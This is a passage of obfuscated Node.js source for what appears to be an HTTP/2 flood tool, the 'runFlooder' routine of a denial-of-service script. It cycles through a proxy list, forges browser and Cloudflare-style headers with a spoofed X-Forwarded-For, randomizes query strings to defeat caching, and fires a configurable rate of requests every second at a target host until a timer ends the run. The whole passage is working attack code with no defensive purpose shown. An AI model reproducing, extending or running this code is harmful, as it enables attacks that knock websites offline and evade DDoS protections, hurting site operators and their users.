		_0x56d07f.on('connect',()=>{
			_0x56d07f.write(_0x776691);
		});
		_0x56d07f.on('data',_0x510784=>{
			const _0x5d1d57=_0x510784.toString('utf-8');
			const _0x42328b=_0x5d1d57.includes('HTTP/1.1 200');
			if(_0x42328b===false){
				_0x56d07f.destroy();
				return _0x5425aa(undefined,'error: invalid response from proxy server');
			}
			return _0x5425aa(_0x56d07f,undefined);
		});
		_0x56d07f.on('timeout',()=>{
			_0x56d07f.destroy();
			return _0x5425aa(undefined,'error: timeout exceeded');
		});
		_0x56d07f.on('error',_0xceb843=>{
			_0x56d07f.destroy();
			return _0x5425aa(undefined,'error: '+_0xceb843);
		});
	}
}
function buildPathWithQuery(_0x54191f,_0x2c0cc8){
	if(_0x2c0cc8){
		return _0x54191f.path+'?'+generateRandomString(5,10)+'='+generateRandomString(11,15);
	}else{
		return _0x54191f.path;
	}
}
const Socker=new NetSocket();
headers[':authority']=parsedTarget.host;
headers[':method']='GET';
headers[':path']=buildPathWithQuery(parsedTarget);
headers[':scheme']='https';
headers.accept=accept;
headers['accept-encoding']=encoding;
headers['accept-language']=lang;
headers.origin='https://'+parsedTarget.host;
headers.referer='https://'+parsedTarget.host+'/'+randpath;
headers['cdn-loop']='cloudflare';
headers['sec-ch-ua']='"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"';
headers['sec-ch-ua-mobile']='?0';
headers['sec-ch-ua-platform']='"Windows"';
headers['sec-fetch-dest']=dest_header[Math.floor(Math.random()*dest_header.length)];
headers['sec-fetch-mode']=mode_header[Math.floor(Math.random()*mode_header.length)];
headers['sec-fetch-site']=site_header[Math.floor(Math.random()*site_header.length)];
headers['sec-fetch-user']='?1';
headers['upgrade-insecure-requests']='1';
headers.dnt=Math.random()<0.5?'1':'0';
headers['x-requested-with']='XMLHttpRequest';
function runFlooder(){
	const _0x144ad1=randomElement(proxies);
	const _0x401ec7=_0x144ad1.split(':');
	headers['cf-worker']=parsedTarget.host;
	headers['user-agent']=uap1;
	headers['x-forwarded-for']=spoofed;
	headers['x-forwarded-proto']='https';
	const _0x92fbcd={'host':_0x401ec7[0],'port':~~_0x401ec7[1],'address':parsedTarget.host+':443','timeout':100};
	Socker.HTTP(_0x92fbcd,(_0x3a5c99,_0xf4e7ea)=>{
		if(_0xf4e7ea)return;
		_0x3a5c99.setKeepAlive(true,600000);
		const _0x46ed97={'host':parsedTarget.host,'port':443,'secure':true,'ALPNProtocols':['h3', 'h2', 'http/1.1', 'h1', 'spdy/3.1', 'http/2+quic/43', 'http/2+quic/44', 'http/2+quic/45'],'sigals':siga,'socket':_0x3a5c99,'ciphers':tls.getCiphers().join(':')+cipper,'ecdhCurve':'prime256v1:X25519','host':parsedTarget.host,'honorCipherOrder':false,'rejectUnauthorized':false,'servername':parsedTarget.host,'secureProtocol':'TLS_method'};
		const _0x3c9eaf=tls.connect(443,parsedTarget.host,_0x46ed97);
		_0x3c9eaf.setKeepAlive(true,60000);
		const _0x232d90=http2.connect(parsedTarget.href,{'protocol':'https:','settings':{'headerTableSize':65536,'maxConcurrentStreams':1000,'initialWindowSize':6291456,'maxHeaderListSize':262144,'enablePush':false},'maxSessionMemory':64000,'maxDeflateDynamicTableSize':4294967295,'createConnection':()=>_0x3c9eaf,'socket':_0x3a5c99});
		_0x232d90.settings({'headerTableSize':65536,'maxConcurrentStreams':1000,'initialWindowSize':6291456,'maxHeaderListSize':262144,'enablePush':false});
		_0x232d90.on('connect',()=>{
			const _0x6b9a44=setInterval(()=>{
				for(let _0x532c5d=0;_0x532c5d<args.Rate;_0x532c5d++){
					const _0x15203a=_0x232d90.request(headers).on('response',_0x4f04ce=>{
						_0x15203a.close();
						_0x15203a.destroy();
						return;
					});
					_0x15203a.end();
				}
			},1000);
		});
		_0x232d90.on('close',()=>{
			_0x232d90.destroy();
			_0x3a5c99.destroy();
			return;
		});
	}),function(_0xc751a6,_0x88e2eb,_0x241207){};
}
const KillScript=()=>process.exit(1);
setTimeout(KillScript,args.time*1000);